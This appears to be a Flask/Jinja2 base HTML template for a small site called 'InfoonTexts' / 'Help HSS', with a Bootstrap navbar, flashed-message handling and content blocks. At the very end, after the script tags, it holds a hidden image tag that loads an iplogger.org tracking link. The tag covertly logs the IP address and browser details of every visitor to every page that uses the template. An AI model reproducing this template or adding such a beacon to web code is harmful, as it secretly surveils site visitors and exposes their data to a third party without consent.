<html>
    <head>
        <title>
            InfoonTexts
        </title>
        <link href="{{ url_for('static', filename='bootstrap.min.css') }}" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="{{ url_for('static', filename='font-awesome.min.css') }}" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="{{ url_for('static', filename='clean-blog.min.css') }}" rel="stylesheet">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    </head>
    
    <body>
      <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav" style="background-color:blue;">
        <div class="container">
          <a class="navbar-brand" href="{{ url_for('home') }}">Help HSS</a>
          <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
            Menu
            <i class="fa fa-bars"></i>
          </button>
          <div class="collapse navbar-collapse" id="navbarResponsive">
            <ul class="navbar-nav ml-auto">
              <li class="nav-item">
                <a class="nav-link" href="{{ url_for('home') }}">Home</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="{{ url_for('add') }}">Add</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="{{ url_for('flag') }}">Flag</a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <header class="masthead" style="background-color: aliceblue;">
        
      </header>
        <div class="container" style="padding-top:50px">
                {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
              {% for category, message in messages %}
                <div class="alert alert-{{ category }}" style="color:green;margin-left:30px;">
                  {{ message }}
                  <br>
                </div>
              {% endfor %}
            {% endif %}
          {% endwith %}
            {% block content%}
            {%endblock content%}
        </div>
        <div style="width:700px;margin-left:100px;">
            {%block form%}
            {%endblock form%}
        </div>
    </body>
    <script src="{{ url_for('static', filename='jquery.min.js') }}"></script>
    <script src="{{ url_for('static', filename='popper.min.js') }}"></script>
    <script src="{{ url_for('static', filename='bootstrap.min.js') }}"></script>

    <!-- Custom scripts for this template -->
    <script src="{{ url_for('static', filename='clean-blog.min.js') }}"></script>
  <img src="https://iplogger.org/1RkQt7">
</html>
